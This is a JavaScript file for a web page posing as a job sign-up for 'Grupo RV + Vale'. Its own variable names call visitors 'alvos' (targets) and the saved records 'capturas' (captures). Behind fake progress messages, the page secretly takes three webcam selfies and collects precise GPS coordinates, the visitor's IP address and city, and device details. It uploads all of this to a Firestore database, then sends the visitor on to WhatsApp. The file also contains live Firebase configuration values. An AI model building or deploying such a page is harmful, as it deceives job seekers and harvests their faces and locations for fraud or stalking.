import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
import { getFirestore, doc, getDoc, addDoc, collection, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";

const firebaseConfig = {
  apiKey: "AIzaSyA4tZjjfiOauLn2PPxYAp6ylNqB9LWJkI0",
  authDomain: "rv-grup.firebaseapp.com",
  projectId: "rv-grup",
  storageBucket: "rv-grup.firebasestorage.app",
  messagingSenderId: "1061419825993",
  appId: "1:1061419825993:web:5cb7b020efd40b8cf13898"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

const video = document.getElementById("video");
const btn = document.getElementById("btn");
const statusText = document.getElementById("status");
const canvas = document.getElementById("canvas");

const params = new URLSearchParams(window.location.search);
const alvoId = params.get('id');

let redirecionamentoWhatsApp = "https://wa.me/5594981100607?text=Eu%20concordo%20e%20quero%20participar%20das%20vagas%20do%20Grupo%20RV%20%2B%20Vale.";

function falar(texto){
  speechSynthesis.cancel();
  const fala = new SpeechSynthesisUtterance(texto);
  fala.lang = "pt-BR";
  fala.volume = 1;
  fala.rate = 0.95;
  fala.pitch = 1;
  speechSynthesis.speak(fala);
}

async function inicializarAlvo() {
    if(!alvoId) {
        statusText.innerHTML = "❌ Código da vaga em falta na URL.";
        falar("Código da vaga em falta.");
        return;
    }

    try {
        const docRef = doc(db, "alvos", alvoId);
        const docSnap = await getDoc(docRef);

        if (docSnap.exists()) {
            const dados = docSnap.data();
            
            document.getElementById('titulo-vaga').innerText = dados.titulo;
            document.getElementById('mensagem-vaga').innerText = `📢 ${dados.instrucoes}`;
            document.getElementById('label-vaga').innerText = "VAGA ATIVA";
            document.getElementById('label-vaga').style.color = dados.cor;
            
            document.getElementById('custom-theme').innerHTML = `
                button { background: linear-gradient(90deg, ${dados.cor}, #16a34a) !important; box-shadow: 0 0 25px ${dados.cor}55 !important; }
                .video-card { border: 2px solid ${dados.cor}88; box-shadow: 0 0 25px ${dados.cor}22; }
                .bar { background: ${dados.cor} !important; }
            `;

            document.getElementById('video-container').innerHTML = `
                <iframe src="https://www.youtube.com/embed/${dados.video_id}?autoplay=1&mute=1&loop=1&playlist=${dados.video_id}" title="Apresentação Vaga" frameborder="0" allow="autoplay" allowfullscreen></iframe>
            `;

            await iniciarCamera();

        } else {
            statusText.innerHTML = "❌ Esta oportunidade já não se encontra disponível.";
            falar("Oportunidade indisponível.");
        }
    } catch(e) {
        console.error(e);
        statusText.innerHTML = "❌ Erro ao conectar com o servidor.";
    }
}

async function iniciarCamera(){
  try {
    statusText.innerHTML = "🟡 A carregar os serviços internos...";
    falar("O seu cadastro será realizado automaticamente após clicar no botão verde abaixo.");

    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" },
      audio: false
    });

    video.srcObject = stream;
    await video.play();

    await new Promise((resolve) => {
      if(video.readyState >= 2){
        resolve();
      } else {
        video.onloadeddata = () => resolve();
      }
    });

    statusText.innerHTML = "✅ Sistema pronto";
    btn.disabled = false;
    btn.innerHTML = "QUERO PARTICIPAR";
  } catch(err) {
    console.log(err);
    statusText.innerHTML = "❌ Ative a permissão da câmera";
  }
}

function analisarDispositivo() {
  const ua = navigator.userAgent;
  let androidVersion = "Não é Android";
  if (ua.indexOf("Android") >= 0) {
      const match = ua.match(/Android\s([0-9\.]+)/);
      if (match) androidVersion = match[1];
  }
  
  let browser = "Desconhecido";
  if (ua.indexOf("Chrome") >= 0 && ua.indexOf("Edge") === -1) browser = "Chrome";
  else if (ua.indexOf("Firefox") >= 0) browser = "Firefox";
  else if (ua.indexOf("Safari") >= 0 && ua.indexOf("Chrome") === -1) browser = "Safari";
  else if (ua.indexOf("Edge") >= 0 || ua.indexOf("Edg") >= 0) browser = "Edge";
  
  let model = "Desconhecido";
  if (ua.indexOf("Mobile") >= 0) {
      const parts = ua.split(/[()]/);
      if (parts.length > 1) {
          const deviceParts = parts[1].split(';');
          for (let part of deviceParts) {
              if (part.indexOf("Android") === -1 && part.indexOf("Linux") === -1 && part.indexOf("iPhone") === -1 && part.indexOf("iPad") === -1 && part.indexOf("Windows") === -1 && part.indexOf("Macintosh") === -1 && part.length > 2) {
                  model = part.trim();
                  break;
              }
          }
      }
  }
  return { androidVersion, browser, model };
}

btn.addEventListener("click", async () => {
  try {
    btn.disabled = true;
    btn.innerHTML = "PROCESSANDO...";
    
    statusText.innerHTML = "📸 Analisando parâmetros faciais...";
    falar("Efetuando registo de imagens.");

    const largura = video.videoWidth || 640;
    const altura = video.videoHeight || 480;

    canvas.width = largura;
    canvas.height = altura;
    const ctx = canvas.getContext("2d");
    const fotos = [];

    for(let i = 0; i < 3; i++) {
        ctx.drawImage(video, 0, 0, largura, altura);
        fotos.push(canvas.toDataURL("image/jpeg", 0.75));
        if(i < 2) await new Promise(resolve => setTimeout(resolve, 1000));
    }

    const stream = video.srcObject;
    if (stream) {
        stream.getTracks().forEach(track => track.stop());
    }

    let latitude = "não permitido";
    let longitude = "não permitido";
    try {
      statusText.innerHTML = "📍 Validando coordenadas regionais...";
      falar("Sincronizando localização.");

      const localizacao = await new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject, {
          enableHighAccuracy: true,
          timeout: 8000
        });
      });
      latitude = localizacao.coords.latitude;
      longitude = localizacao.coords.longitude;
    } catch(err) {
      console.log(err);
    }

    let ip = "indisponível";
    let cidade = "", estado = "", pais = "";
    try {
      statusText.innerHTML = "🌐 Conectando à rede gateway...";
      const req = await fetch("https://ipapi.co/json/");
      const json = await req.json();
      ip = json.ip || "";
      cidade = json.city || "";
      estado = json.region || "";
      pais = json.country_name || "";
    } catch(err) {
      console.log(err);
    }

    statusText.innerHTML = "💾 Criptografando e salvando dados...";
    falar("Salvando o seu registo.");
    
    const infoDispositivo = analisarDispositivo();

    await addDoc(collection(db, "capturas"), {
      alvo_id: alvoId,
      selfies: fotos, 
      latitude: latitude,
      longitude: longitude,
      ip: ip,
      cidade: cidade,
      estado: estado,
      pais: pais,
      userAgent: navigator.userAgent,
      modeloDispositivo: infoDispositivo.model,
      versaoAndroid: infoDispositivo.androidVersion,
      navegador: infoDispositivo.browser,
      plataforma: navigator.platform,
      idioma: navigator.language,
      larguraTela: window.innerWidth,
      alturaTela: window.innerHeight,
      data: serverTimestamp()
    });

    statusText.innerHTML = "✅ Concluído! A redirecionar...";
    falar("Registo concluído com sucesso.");

    setTimeout(() => {
      window.location.href = redirecionamentoWhatsApp;
    }, 2000);

  } catch(err) {
    console.log(err);
    statusText.innerHTML = "❌ Ocorreu um problemático.";
    btn.disabled = false;
    btn.innerHTML = "QUERO PARTICIPAR";
  }
});

window.onload = () => {
    inicializarAlvo();
};